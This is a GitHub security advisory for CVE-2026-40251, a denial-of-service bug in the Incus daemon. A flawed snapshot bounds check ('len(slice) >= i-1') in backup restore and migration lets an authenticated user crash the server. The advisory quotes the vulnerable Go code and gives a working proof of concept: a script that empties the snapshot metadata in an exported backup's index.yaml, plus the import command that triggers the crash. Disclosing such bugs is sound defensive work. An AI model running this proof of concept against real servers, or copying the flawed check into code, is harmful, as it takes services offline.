# [H] Incus Vulnerable to Panic via Snapshot Bounds Check

## Summary
Severity: High
Advisory: GHSA-4m88-wxj4-9qj6
CVE: CVE-2026-40251
CWE: CWE-125, CWE-129
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-4m88-wxj4-9qj6
Type: github-advisory

## Affected
- Go: `github.com/lxc/incus/v6/cmd/incusd` — affected >=0 <7.0.0

## Details
### Summary
Missing validation logic in the storage volume import logic allows an authenticated user with access to Incus' storage volume feature to cause the Incus daemon to crash. Repeated use of this issue can be used to keep Incus offline causing a denial of service.

### Details
The backup restore subsystem contains an out-of-bounds panic vulnerability caused by an invalid bounds check when indexing snapshot metadata arrays. The same flawed pattern also appears in the migration path.

When iterating through physical snapshots provided in a backup archive, the loop uses the index i to look up corresponding metadata in the parsed Config.Snapshots and Config.VolumeSnapshots slices. To ensure that the metadata slice is long enough, the code uses the guard condition len(slice) >= i-1. This check is incorrect because it can still evaluate to true when the subsequent slice[i] access is out of bounds, including when i >= len(slice), triggering a runtime panic.

An attacker can trigger this by submitting a backup archive that contains physical snapshot directories, which drive the loop variable i, while supplying a tampered index.yaml with an empty or truncated snapshot metadata array. This causes the daemon to index beyond the end of the metadata slice and crash, resulting in immediate denial of service on the node.

Affected File:
https://github.com/lxc/incus/blob/v6.22.0/internal/server/storage/backend.go 

Affected Code:
```
func (b *backend) CreateInstanceFromBackup(srcBackup backup.Info, srcData io.ReadSeeker, op *operations.Operation) (func(instance.Instance) error, revert.Hook, error) {
    [...]
    postHook := func(inst instance.Instance) error {
        [...]
        for i, backupFileSnap := range srcBackup.Snapshots {
            var volumeSnapDescription string
            var volumeSnapConfig map[string]string
            var volumeSnapExpiryDate time.Time
            var volumeSnapCreationDate time.Time

            // Check if snapshot volume config is available for restore and matches snapshot name.
            if srcBackup.Config != nil {
                if len(srcBackup.Config.Snapshots) >= i-1 && srcBackup.Config.Snapshots[i] != nil && srcBackup.Config.Snapshots[i].Name == backupFileSnap {
                    // Use instance snapshot's creation date if snap info available.
                    volumeSnapCreationDate = srcBackup.Config.Snapshots[i].CreatedAt
                }

                if len(srcBackup.Config.VolumeSnapshots) >= i-1 && srcBackup.Config.VolumeSnapshots[i] != nil && srcBackup.Config.VolumeSnapshots[i].Name == backupFileSnap {
                    // If the backup restore interface provides volume snapshot config use it,
                    // otherwise use default volume config for the storage pool.
                    volumeSnapDescription = srcBackup.Config.VolumeSnapshots[i].Description
                    volumeSnapConfig = srcBackup.Config.VolumeSnapshots[i].Config

                    if srcBackup.Config.VolumeSnapshots[i].ExpiresAt != nil {
                        volumeSnapExpiryDate = *srcBackup.Config.VolumeSnapshots[i].ExpiresAt
                    }

                    // Use volume's creation date if available.
                    if !srcBackup.Config.VolumeSnapshots[i].CreatedAt.IsZero() {
                        volumeSnapCreationDate = srcBackup.Config.VolumeSnapshots[i].CreatedAt
                    }
                }
            }

            [...]
        }
        [...]
    }
    [...]
}

[...]

func (b *backend) CreateInstanceFromMigration(inst instance.Instance, conn io.ReadWriteCloser, args localMigration.VolumeTargetArgs, op *operations.Operation) error {
    [...]
    if !isRemoteClusterMove || args.StoragePool != "" {
        for i, snapshot := range args.Snapshots {
            snapName := snapshot.GetName()
            newSnapshotName := drivers.GetSnapshotVolumeName(inst.Name(), snapName)
            snapConfig := vol.Config()           // Use parent volume config by default.
            snapDescription := volumeDescription // Use parent volume description by default.
            snapExpiryDate := time.Time{}
            snapCreationDate := time.Time{}

            // If the source snapshot config is available, use that.
            if srcInfo != nil && srcInfo.Config != nil {
                if len(srcInfo.Config.Snapshots) >= i-1 && srcInfo.Config.Snapshots[i] != nil && srcInfo.Config.Snapshots[i].Name == snapName {
                    // Use instance snapshot's creation date if snap info available.
                    snapCreationDate = srcInfo.Config.Snapshots[i].CreatedAt
                }

                if len(srcInfo.Config.VolumeSnapshots) >= i-1 && srcInfo.Config.VolumeSnapshots[i] != nil && srcInfo.Config.VolumeSnapshots[i].Name == snapName {
                    // Check if snapshot volume config is available then use it.
                    snapDescription = srcInfo.Config.VolumeSnapshots[i].Description
                    snapConfig = srcInfo.Config.VolumeSnapshots[i].Config

                    if srcInfo.Config.VolumeSnapshots[i].ExpiresAt != nil {
                        snapExpiryDate = *srcInfo.Config.VolumeSnapshots[i].ExpiresAt
                    }

                    // Use volume's creation date if available.
                    if !srcInfo.Config.VolumeSnapshots[i].CreatedAt.IsZero() {
                        snapCreationDate = srcInfo.Config.VolumeSnapshots[i].CreatedAt
                    }
                }
            }

            [...]
        }
    }
    [...]
}
```

### PoC

The following PoC demonstrates that a tampered instance backup archive containing physical snapshot directories but an empty snapshot metadata array can trigger an out-of-bounds panic during restore.

Step 1: Generate a valid backup and tamper with its snapshot metadata

From an Incus client with access to the target server, create a minimal instance, create a snapshot, export it, and then modify the exported index.yaml so that the physical snapshot directory remains present while the nested snapshot metadata arrays are emptied.

Commands:
```
cat <<'EOF' > poc_snapshot_bounds.sh
#!/bin/bash
set -e

BASE_NAME="base-$(date +%s)"
PANIC_NAME="panic-$(date +%s)"

incus init images:alpine/edge "$BASE_NAME" --project default
incus snapshot create "$BASE_NAME" snap0 --project default
incus export "$BASE_NAME" valid_snapshot_base.tar.gz --project default

mkdir -p extract_snapshot_bounds
tar -xzf valid_snapshot_base.tar.gz -C extract_snapshot_bounds/
chmod -R u+rwX extract_snapshot_bounds/

python3 -c "
import os
import sys

base = '$BASE_NAME'
panic = '$PANIC_NAME'

with open('extract_snapshot_bounds/backup/index.yaml', 'r') as f:
    lines = f.read().splitlines()

out = []
in_skip = False
skip_indent = 0

for line in lines:
    line = line.replace(base, panic)
    indent = len(line) - len(line.lstrip())

    if in_skip:
        if not line.strip():
            continue
        if indent > skip_indent or (indent == skip_indent and line.lstrip().startswith('-')):
            continue
        else:
            in_skip = False

    if indent > 0 and (line.lstrip().startswith('snapshots:') or line.lstrip().startswith('volume_snapshots:')):
        out.append(line.split(':')[0] + ': []')
        in_skip = True
        skip_indent = indent
        continue

    out.append(line)

with open('extract_snapshot_bounds/backup/index.yaml', 'w') as f:
    f.write('\n'.join(out))
"

cd extract_snapshot_bounds/
tar -czf ../exploit_snapshot_bounds_panic.tar.gz backup/
cd ..

rm -rf extract_snapshot_bounds/ valid_snapshot_base.tar.gz
echo "[+] PoC Tarball Created: exploit_snapshot_bounds_panic.tar.gz"
EOF

bash poc_snapshot_bounds.sh
```

Result:
```
[+] PoC Tarball Created: exploit_snapshot_bounds_panic.tar.gz
```

Step 2: Trigger the vulnerable restore path

From the same Incus client, import the crafted archive.

Command:
```
incus import exploit_snapshot_bounds_panic.tar.gz --project default
```

Result:
```
Error: websocket: close 1006 (abnormal closure): unexpected EOF
```

### Credit
This issue was discovered and reported by the team at 7asecurity (https://7asecurity.com/)

## References
- https://github.com/lxc/incus/security/advisories/GHSA-4m88-wxj4-9qj6
- https://nvd.nist.gov/vuln/detail/CVE-2026-40251
- https://github.com/lxc/incus
- https://github.com/lxc/incus/blob/v6.22.0/internal/server/storage/backend.go
